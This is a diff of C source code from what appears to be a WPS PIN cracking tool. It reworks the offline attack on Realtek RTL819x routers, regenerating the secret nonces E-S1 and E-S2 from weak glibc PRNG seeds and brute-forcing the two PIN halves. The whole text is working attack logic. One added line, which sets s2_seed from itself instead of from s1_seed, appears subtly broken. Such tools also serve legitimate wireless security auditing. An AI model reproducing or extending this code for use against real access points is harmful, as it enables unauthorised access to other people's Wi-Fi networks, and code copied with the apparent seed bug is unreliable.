@@ -49,7 +49,10 @@
 uint32_t ecos_rand_simplest(uint32_t *seed);
 uint32_t ecos_rand_simple(uint32_t *seed);
 uint32_t ecos_rand_knuth(uint32_t *seed);
-uint_fast8_t crack(struct global *g, char *pin);
+
+static int crack_first_half(struct global *wps, char *pin);
+static int crack_second_half(struct global *wps, char *pin);
+static int crack(struct global *wps, char *pin);
 
 static const char *option_string = "e:r:s:z:a:n:m:b:o:v:j:5:7:SflVh?";
 static const struct option long_options[] = {
@@ -293,6 +296,20 @@ unsigned int hardware_concurrency()
 #endif
 }
 
+static void rtl_nonce_fill(uint8_t *nonce, uint32_t seed)
+{
+	struct glibc_prng glibc_prng;
+	int i;
+	uint8_t *ptr = nonce;
+
+	glibc_seed(&glibc_prng, seed);
+	
+	for (i = 0; i < 4; i++, ptr += 4) {
+		uint32_t be = end_htobe32(glibc_rand(&glibc_prng));
+		memcpy(ptr, &be, sizeof be);
+	}
+}
+
 static int find_rtl_es_dir(struct global *wps, char *pin, int dir)
 {
 	uint_fast8_t found_p_mode = NONE;
@@ -307,61 +324,37 @@ static int find_rtl_es_dir(struct global *wps, char *pin, int dir)
 		DEBUG_PRINT("Trying forward in time");
 	else
 		DEBUG_PRINT("Trying backwards in time");
+		
+	for (i = 0; i != break_cond; i += dir) {
+		rtl_nonce_fill(wps->e_s1, wps->nonce_seed + i);
 
-	do {
-		i += dir;
-		glibc_seed(&glibc_prng, wps->nonce_seed + i);
-		for (uint_fast8_t j = 0; j < 4; j++) {
-			uint32_t be = end_htobe32(glibc_rand(&glibc_prng));
-			memcpy(&(wps->e_s1[4 * j]), &be, sizeof(uint32_t));
-		}
-		memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* E-S1 = E-S2 != E-Nonce */
-		wps->s1_seed = wps->nonce_seed + i;
-		wps->s2_seed = wps->nonce_seed + i;
-
-		DEBUG_PRINT("Trying (%10u) with E-S1: ", wps->s1_seed);
+		DEBUG_PRINT("Trying (%10u) with E-S1: ", wps->nonce_seed + i);
 		DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
-		DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s2_seed);
-		DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
-
-		uint_fast8_t r = crack(wps, pin);
-		if (r == PIN_FOUND) {
-			found_p_mode = RTL819x;
-			DEBUG_PRINT("Pin found");
-		}
-		else if (r == PIN_ERROR) {
-			if (i == 1 || i == -1) {
-				memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
-				memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
-			}
-			else {
-				memcpy(wps->e_s1, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
-				memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
-			}
-			if (dir == 1) {
-				wps->s1_seed = wps->nonce_seed + i - dir;
-				wps->s2_seed = wps->nonce_seed + i;
-			}
-			else {
-				wps->s1_seed = wps->nonce_seed + i;
-				wps->s2_seed = wps->nonce_seed + i - dir;
-			}
-
-			DEBUG_PRINT("Trying (%10u) with E-S1: ", wps->s1_seed);
-			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
-			DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s2_seed);
-			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
-
-			uint_fast8_t r2 = crack(wps, pin);
-			if (r2 == PIN_FOUND) {
-				found_p_mode = RTL819x;
-				DEBUG_PRINT("Pin found");
+		
+		if (crack_first_half(wps, pin)) {
+			DEBUG_PRINT("First pin half found");
+			wps->s1_seed = wps->nonce_seed + i;
+			char pin_copy[WPS_PIN_LEN + 1];
+			strcpy(pin_copy, pin);
+			int j;
+			/* we assume that the seed used for es2 is within a range of 10 seconds
+			   forwards in time only */
+			for (j = 0; j < 10; j++) {
+				strcpy(pin, pin_copy);
+				rtl_nonce_fill(wps->e_s2, wps->s1_seed + j);
+				DEBUG_PRINT("Trying (%10u) with E-S2: ", wps->s1_seed + j);
+				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+				if (crack_second_half(wps, pin)) {
+					wps->s2_seed = wps->s2_seed + j;
+					DEBUG_PRINT("Pin found");
+					return RTL819x;
+				}
 			}
 		}
-	} while (found_p_mode == NONE && i != break_cond);
-
-	return found_p_mode;
+	}
+	return NONE;
 }
+		
 
 static int find_rtl_es(struct global *wps, char *pin)
 {
@@ -1535,15 +1528,17 @@ static int crack_second_half(struct global *wps, char *pin)
 		}
 
 		uint_to_char_array(second_half, 4, s_pin);
-		if (check_pin_half(s_pin, wps->psk2, wps->e_s2, wps, wps->e_hash2))
+		if (check_pin_half(s_pin, wps->psk2, wps->e_s2, wps, wps->e_hash2)) {
+			pin[8] = 0; /* make sure pin string is zero-terminated */
 			return 1;
+		}
 	}
 	
 	return 0;
 }
 
 /* PIN cracking attempt - returns 0 for success, 1 for failure */
-uint_fast8_t crack(struct global *wps, char *pin)
+static int crack(struct global *wps, char *pin)
 {
 	return !(crack_first_half(wps, pin) && crack_second_half(wps, pin));
 		
